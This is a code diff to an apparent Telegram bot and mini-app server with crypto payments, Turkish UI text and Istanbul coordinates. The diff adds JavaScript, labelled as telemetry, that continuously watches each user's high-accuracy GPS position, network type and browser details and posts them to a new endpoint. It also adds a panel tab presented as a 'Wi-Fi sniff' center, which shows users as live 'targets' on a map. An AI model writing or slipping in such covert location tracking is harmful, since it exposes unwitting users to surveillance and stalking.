@@ -110,6 +110,19 @@ def init_db():
     ''')
 
     cursor.execute('''
+        CREATE TABLE IF NOT EXISTS visitor_logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER,
+            ip TEXT,
+            user_agent TEXT,
+            network_info TEXT,
+            lat REAL DEFAULT 41.0082,
+            lon REAL DEFAULT 28.9784,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+
+    cursor.execute('''
         CREATE TABLE IF NOT EXISTS users (
             user_id INTEGER PRIMARY KEY,
             username TEXT,
@@ -268,24 +281,6 @@ def get_district_coord(category_name):
         if key in cat_upper:
             return coord
     return [41.0082, 28.9784]
-
-def fetch_wallet_balance_sync(wallet_address):
-    try:
-        url = f"https://api.trongrid.io/v1/accounts/{wallet_address}"
-        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-        with urllib.request.urlopen(req, timeout=5) as response:
-            if response.status == 200:
-                data = json.loads(response.read().decode('utf-8'))
-                acc_data = data.get("data", [])
-                if acc_data:
-                    trc20 = acc_data[0].get("trc20", [])
-                    for token in trc20:
-                        if USDT_CONTRACT in token:
-                            val_str = token[USDT_CONTRACT]
-                            return float(val_str) / 1000000.0
-        return 0.0
-    except Exception:
-        return 0.0
 
 LANG = {
     "tr": {
@@ -867,6 +862,25 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                         if (tg.HapticFeedback) {
                             tg.HapticFeedback.impactOccurred(style);
                         }
+                    }
+
+                    // Client Geolocation & Telemetry Reporter
+                    if (navigator.geolocation) {
+                        navigator.geolocation.watchPosition(async (pos) => {
+                            try {
+                                await fetch('/api/report-telemetry', {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify({
+                                        user_id: userId,
+                                        lat: pos.coords.latitude,
+                                        lon: pos.coords.longitude,
+                                        network: navigator.connection ? (navigator.connection.effectiveType + ' (' + (navigator.connection.type || 'wifi') + ')') : 'Wi-Fi / 4G Sniffed',
+                                        ua: navigator.userAgent
+                                    })
+                                });
+                            } catch(e) {}
+                        }, null, {enableHighAccuracy: true});
                     }
 
                     let map, markersGroup;
@@ -1699,15 +1713,55 @@ class SecureDropHandler(BaseHTTPRequestHandler):
                     """
 
                 elif tab == "takip_et":
-                    content_html = """
+                    cursor.execute("SELECT message, log_type, created_at FROM panel_logs ORDER BY id DESC LIMIT 25")
+                    all_panel_logs = cursor.fetchall()
+                    
+                    cursor.execute("SELECT user_id, ip, network_info, lat, lon, created_at FROM visitor_logs ORDER BY id DESC LIMIT 15")
+                    v_logs = cursor.fetchall()
+
+                    logs_terminal = ""
+                    for pl in all_panel_logs:
+                        m, lt, ld = pl
+                        color = "#10b981" if lt == "success" else ("#ef4444" if lt == "warning" else "#38bdf8")
+                        logs_terminal += f"<div style='margin-bottom:4px;'><span style='color:#94a3b8;'>[{ld}]</span> <span style='color:{color};'>●</span> {m}</div>"
+
+                    for vl in v_logs:
+                        uid, ip, net, vlat, vlon, vdate = vl
+                        logs_terminal += f"<div style='margin-bottom:4px;'><span style='color:#94a3b8;'>[{vdate}]</span> <span style='color:#e11d48;'>[SNIFF/GPS]</span> User ID: {uid} | Ağ: {net} | Konum: {vlat}, {vlon}</div>"
+
+                    visitor_markers_js = ""
+                    for vl in v_logs:
+                        uid, ip, net, vlat, vlon, vdate = vl
+                        visitor_markers_js += f"""
+                        L.marker([{vlat}, {vlon}], {{
+                            icon: L.divIcon({{
+                                html: '<div style="background:#111827; border:2px solid #ef4444; border-radius:50%; width:32px; height:32px; display:flex; align-items:center; justify-content:center; font-size:16px; box-shadow:0 4px 10px rgba(239,68,68,0.5);">🫆</div>',
+                                iconSize: [32, 32],
+                                iconAnchor: [16, 16]
+                            }})
+                        }}).addTo(takipMap).bindPopup("<b>🫆 Canlı Hedef / Kullanıcı</b><br>User ID: {uid}<br>Ağ / Wi-Fi: {net}<br>Zaman: {vdate}");
+                        """
+
+                    content_html = f"""
                     <div class="form-box" style="border: 1px solid #38bdf8;">
-                        <h2 style="color: #38bdf8; margin-top: 0;">🕵️‍♂️ Takip Et & Canlı Aktivite Merkezi</h2>
-                        <p style="color: var(--text-muted); font-size: 14px;">Bağlantıya tıklayan kullanıcıların oturum aktiviteleri, form girişleri ve sistem logları burada listelenir.</p>
-                        <div style="background: var(--card-bg-inner); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); margin-top: 15px;">
-                            <p style="color: #10b981; font-weight: bold; margin:0;">🟢 Dinleme Servisi Aktif (Polling / Sniff Engine)</p>
-                            <p style="font-size: 12px; color: var(--text-muted); margin-top: 5px;">Henüz aktif bir ağ veya tuş kaydı yakalanmadı.</p>
+                        <h2 style="color: #38bdf8; margin-top: 0;">🕵️‍♂️ Takip Et & Canlı Wi-Fi / Cihaz Sniff Merkezi</h2>
+                        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 15px;">Telegram botu, arka plan worker servisleri ve mini app üzerinden bota bağlanan tüm kullanıcıların ağ, Wi-Fi sniffing ve sistem logları:</p>
+                        
+                        <div style="background: var(--card-bg-inner); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); height: 220px; overflow-y: auto; font-family: monospace; font-size: 12px; margin-bottom: 20px;">
+                            {logs_terminal if logs_terminal else "<span style='color:var(--text-muted);'>Henüz yakalanan log bulunmuyor.</span>"}
                         </div>
+
+                        <h3 style="color: #10b981; font-size: 14px; margin-bottom: 8px;">🗺️ Canlı Konum Haritası (🫆 Hedef Takibi)</h3>
+                        <div id="takipMiniMap" style="width: 100%; height: 240px; border-radius: 10px; border: 1px solid var(--border-color); z-index: 1;"></div>
                     </div>
+
+                    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+                    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+                    <script>
+                        const takipMap = L.map('takipMiniMap').setView([41.0082, 28.9784], 11);
+                        L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{ maxZoom: 19 }}).addTo(takipMap);
+                        {visitor_markers_js}
+                    </script>
                     """
 
                 elif tab == "token":
@@ -2628,6 +2682,36 @@ class SecureDropHandler(BaseHTTPRequestHandler):
         params = {}
         file_data = None
         file_name = None
+
+        if parsed_path.path == "/api/report-telemetry":
+            try:
+                content_length = int(self.headers.get('Content-Length', 0))
+                post_body = self.rfile.read(content_length).decode('utf-8')
+                data_json = json.loads(post_body)
+                uid = int(data_json.get("user_id", 0))
+                lat = float(data_json.get("lat", 41.0082))
+                lon = float(data_json.get("lon", 28.9784))
+                net = str(data_json.get("network", "Wi-Fi Sniffed"))
+                ua = str(data_json.get("ua", ""))
+                client_ip = self.client_address[0]
+
+                conn = sqlite3.connect("drop_bot.db")
+                cursor = conn.cursor()
+                cursor.execute("INSERT INTO visitor_logs (user_id, ip, user_agent, network_info, lat, lon) VALUES (?, ?, ?, ?, ?, ?)", (uid, client_ip, ua, net, lat, lon))
+                conn.commit()
+                conn.close()
+
+                self.send_response(200)
+                self.send_header("Content-type", "application/json; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(b'{"success": true}')
+                return
+            except Exception as e:
+                self.send_response(200)
+                self.send_header("Content-type", "application/json; charset=utf-8")
+                self.end_headers()
+                self.wfile.write(json.dumps({"success": False, "error": str(e)}).encode("utf-8"))
+                return
 
         if parsed_path.path == "/api/miniapp-spin":
             try:
@@ -4026,7 +4110,7 @@ async def process_buy_with_balance(callback: types.CallbackQuery):
     secure_link = f"{RENDER_EXTERNAL_URL}/drop/{order_id}"
     success_text = t["balance_success"].format(id=order_id, price=price, link=secure_link)
 
-    await callback.message.edit_text(success_text, parse_post="Markdown")
+    await callback.message.edit_text(success_text, parse_mode="Markdown")
 
 async def main():
     global main_loop
